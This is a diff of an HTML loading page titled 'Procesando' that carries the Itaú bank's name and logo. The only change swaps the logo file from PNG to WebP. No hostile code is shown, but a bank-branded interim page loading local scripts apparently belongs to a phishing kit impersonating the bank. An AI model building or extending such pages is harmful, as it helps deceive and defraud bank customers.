@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Procesando | ItaÃº</title>
-    <link rel="icon" type="image/png" href="itau_logo.png">
+    <link rel="icon" type="image/png" href="itau_logo.webp">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script type="text/javascript" src="../../scripts/functions2.js"></script>
@@ -140,7 +140,7 @@
 <body>
 
     <div class="loader-container">
-        <img src="itau_logo.png" alt="ItaÃº" class="logo-itau">
+        <img src="itau_logo.webp" alt="ItaÃº" class="logo-itau">
         
         <div class="spinner-box">
             <div class="ripple"></div>
